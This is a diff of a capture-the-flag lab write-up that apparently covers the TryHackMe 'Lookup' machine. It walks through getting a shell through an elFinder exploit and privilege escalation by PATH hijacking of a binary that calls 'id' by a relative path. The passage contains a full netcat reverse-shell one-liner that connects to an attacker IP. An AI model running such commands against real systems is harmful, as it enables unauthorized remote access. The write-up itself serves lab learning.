@@ -47,7 +47,7 @@ ElFinder is an opensource file management software that wants to offer a desktop
     set rhosts files.lookup.thm
     run
 
-And it should open a meterpreter session. Now, I can't use metasploit, so I used the `shell` command to drop to a system shell, and then opened a reverse shell on another terminal because I really don't know how to use meterpreter very well, I need to do a tutorial. For the reverse shell I opened a netcat listener on my machine and then used then from the dropped shell I run `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.90.188 5555 >/tmp/f`.
+And it should open a meterpreter session. Now, I can't use metasploit, so I used the `shell` command to drop to a system shell, and then opened a reverse shell on another terminal because I really don't know how to use meterpreter very well, I need to do a tutorial. For the reverse shell I opened a netcat listener on my machine and from the dropped shell I run `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.90.188 5555 >/tmp/f`.
 First thing I notice: the user `think` has the user flag, and inside his home directory I see a `.passwords` file that I can't read. So my guess is that I need to find a way to read that file. <br />
 Using linpeas on the target system, I found an interesting binary that might be exploited:<br />
 ![image](https://github.com/user-attachments/assets/883cfbee-381e-4cee-953c-747b15f65b58)<br />
@@ -65,7 +65,7 @@ The binary takes the stdoutput of the `id` command, and then ignores the user-ID
 This binary will only consider the string underlined in red, which is `www-data`.<br />
 At this point it tries to read the .passwords file, just like I guessed earlier:<br />
 ![image](https://github.com/user-attachments/assets/c9b61b17-9bc3-4016-a479-07e23c67c7b0)<br />
-So I think I know where the vunlnerability lies. The binary is calling the `id` command, but not `/usr/bin/id` or whatever; the path is relative, not absolute. This means that I can create a custom `id` command on any directory, for example /tmp/, and then change the `PATH` environment variable to search for binaries inside /tmp/ first. So let's try it. I created the custom `id` command inside /tmp/, and it prints echos a string on stdoutput, built to fool the `pwm` binary that I'm actually the user `think`. The code can be found in this folder in the file `fake_id`. Remember to call it `id` and to make it executable with `chmod +x id`. Now we want to change the PATH environment variable: run `export PATH=/tmp:$PATH`. Now if I run `id`:<br />
+So I think I know where the vunlnerability lies. The binary is calling the `id` command, but not `/usr/bin/id` or whatever; the path is relative, not absolute. This means that I can create a custom `id` command on any directory, for example /tmp/, and then change the `PATH` environment variable to search for binaries inside /tmp/ first. So let's try it. I created the custom `id` command inside /tmp/, and it echoes a string on stdoutput, built to fool the `pwm` binary that I'm actually the user `think`. The code can be found in this folder in the file `fake_id`. Remember to call it `id` and to make it executable with `chmod +x id`. Now we want to change the PATH environment variable: run `export PATH=/tmp:$PATH`. Now if I run `id`:<br />
 ![image](https://github.com/user-attachments/assets/6cbecb52-7293-410e-8376-a33ac0de5a40)<br />
 It executes my `fake_id`. The setup is ready, let's run the vulnerable binary: <br/ >
 ![image](https://github.com/user-attachments/assets/1c753f57-ae4f-4d84-a83c-e1c1700bf7ba)<br />
